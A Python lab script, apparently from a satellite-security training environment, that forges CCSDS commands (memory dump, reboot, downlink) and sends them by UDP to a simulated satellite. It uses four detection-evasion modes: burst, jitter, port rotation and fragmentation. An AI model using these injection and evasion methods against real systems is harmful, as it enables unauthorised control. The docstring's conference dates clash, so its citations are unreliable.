#!/usr/bin/env python3
"""
rf_obfuscator.py — RF-Layer Obfuscation Techniques
SpaceVE-1 Lab Loader

Educational module demonstrating how attackers obscure command injection
at the RF/physical layer. These techniques are documented in:

  - Turla DVB-S C2 (2015): injected commands over satellite TV broadcast
  - DEF CON 29 "Satellite Hacking for Fun" (Aitel, 2021)
  - DEF CON 34 "SpaceSec" talks (2024)

Techniques modeled here (all in software — no RF hardware required):

  1. Frequency hopping simulation: demonstrates how commands could be
     distributed across multiple frequencies to evade detection
     (SpaceVE-1 uses UDP, so this is simulated by port rotation)

  2. Burst injection: sends multiple commands in rapid succession
     to mask individual packet timing analysis

  3. Timing jitter: randomizes inter-packet delay to defeat
     traffic analysis that identifies command patterns by timing

  4. Payload fragmentation: splits a CCSDS command across multiple
     UDP packets (simulating signal splitting across frequency bands)

NOTE: This module simulates RF obfuscation in the IP/UDP layer.
Real satellite RF attacks require SDR hardware (HackRF, USRP)
and are governed by ITU Radio Regulations Article 15.

Usage:
  python3 rf_obfuscator.py --mode burst --cmd downlink_on
  python3 rf_obfuscator.py --mode jitter --cmd camera_on
  python3 rf_obfuscator.py --mode hopping --cmd nop
  python3 rf_obfuscator.py --mode fragment --cmd memory_dump
"""

import argparse
import random
import socket
import struct
import time

SATELLITE_IP   = "192.168.60.100"
SATELLITE_PORT = 1234
SATELLITE_APID = 0x200

COMMANDS = {
    "nop":          0x00,
    "camera_on":    0x01,
    "camera_off":   0x02,
    "downlink_on":  0x03,
    "downlink_off": 0x04,
    "memory_dump":  0x05,
    "reboot":       0x06,
}


def build_ccsds(func_code: int, user_data: bytes = b"", seq: int = 0) -> bytes:
    word0 = (0b000 << 13) | (1 << 12) | (1 << 11) | (SATELLITE_APID & 0x7FF)
    word1 = (0b11 << 14) | (seq & 0x3FFF)
    data_len = 1 + len(user_data)
    primary = struct.pack(">HHH", word0, word1, data_len)
    sec_byte0 = (func_code & 0x7F) << 1
    cksum = 0xFF ^ sec_byte0
    for b in user_data:
        cksum ^= b
    return primary + bytes([sec_byte0, cksum]) + user_data


def send_udp(pkt: bytes, ip: str, port: int):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(pkt, (ip, port))
    sock.close()


def mode_burst(func_code: int, count: int = 5):
    """Send N identical commands in rapid succession."""
    pkt = build_ccsds(func_code)
    print(f"  [BURST] Sending {count} packets to {SATELLITE_IP}:{SATELLITE_PORT}")
    for i in range(count):
        send_udp(pkt, SATELLITE_IP, SATELLITE_PORT)
        print(f"  [BURST] Packet {i+1}/{count}: {pkt.hex()}")
        time.sleep(0.05)
    print(f"  [BURST] Done. Burst injection may evade per-packet rate limiting.")


def mode_jitter(func_code: int, count: int = 5):
    """Send commands with randomized timing to defeat traffic analysis."""
    pkt = build_ccsds(func_code)
    print(f"  [JITTER] Sending {count} packets with randomized delay")
    for i in range(count):
        delay = random.uniform(0.1, 2.0)
        send_udp(pkt, SATELLITE_IP, SATELLITE_PORT)
        print(f"  [JITTER] Packet {i+1}/{count} sent. Next in {delay:.2f}s")
        time.sleep(delay)
    print(f"  [JITTER] Done. Randomized timing defeats fixed-interval detection.")


def mode_hopping(func_code: int, count: int = 5):
    """
    Simulate frequency hopping by rotating source ports.
    (In real RF: commands transmitted on rotating carrier frequencies.)
    SpaceVE-1 UDP port stays fixed; this demo rotates source port
    to simulate the technique's network-layer equivalent.
    """
    pkt = build_ccsds(func_code)
    print(f"  [HOPPING] Simulating frequency hopping via source port rotation")
    src_ports = [random.randint(49152, 65535) for _ in range(count)]
    for i, sp in enumerate(src_ports):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.bind(("", sp))
        except OSError:
            pass
        sock.sendto(pkt, (SATELLITE_IP, SATELLITE_PORT))
        print(f"  [HOPPING] Packet {i+1}/{count} via source port {sp}")
        sock.close()
        time.sleep(0.2)
    print(f"  [HOPPING] Done. Each packet appears from a different source.")


def mode_fragment(func_code: int):
    """
    Fragment a CCSDS packet across multiple UDP datagrams.
    SpaceVE-1 satellite does not reassemble fragments, so this
    demonstrates a technique that would prevent signature detection
    of the full command in a single captured packet.
    In a real scenario the reassembly would happen at a relay node.
    """
    pkt = build_ccsds(func_code)
    half = len(pkt) // 2
    frag1, frag2 = pkt[:half], pkt[half:]
    print(f"  [FRAGMENT] Original packet ({len(pkt)}b): {pkt.hex()}")
    print(f"  [FRAGMENT] Fragment 1 ({len(frag1)}b): {frag1.hex()}")
    print(f"  [FRAGMENT] Fragment 2 ({len(frag2)}b): {frag2.hex()}")
    send_udp(frag1, SATELLITE_IP, SATELLITE_PORT)
    time.sleep(0.1)
    send_udp(frag2, SATELLITE_IP, SATELLITE_PORT)
    print(f"  [FRAGMENT] Sent as 2 fragments. IDS rules matching full packet hex would miss this.")


def main():
    p = argparse.ArgumentParser(description="RF obfuscation technique demonstration")
    p.add_argument("--mode", choices=["burst", "jitter", "hopping", "fragment"], default="burst")
    p.add_argument("--cmd",  choices=list(COMMANDS.keys()), default="nop")
    p.add_argument("--count", type=int, default=5)
    args = p.parse_args()

    fc = COMMANDS[args.cmd]
    print(f"\n  RF Obfuscation: mode={args.mode}, cmd={args.cmd} (0x{fc:02X})\n")

    if args.mode == "burst":
        mode_burst(fc, args.count)
    elif args.mode == "jitter":
        mode_jitter(fc, args.count)
    elif args.mode == "hopping":
        mode_hopping(fc, args.count)
    elif args.mode == "fragment":
        mode_fragment(fc)

    print()


if __name__ == "__main__":
    main()
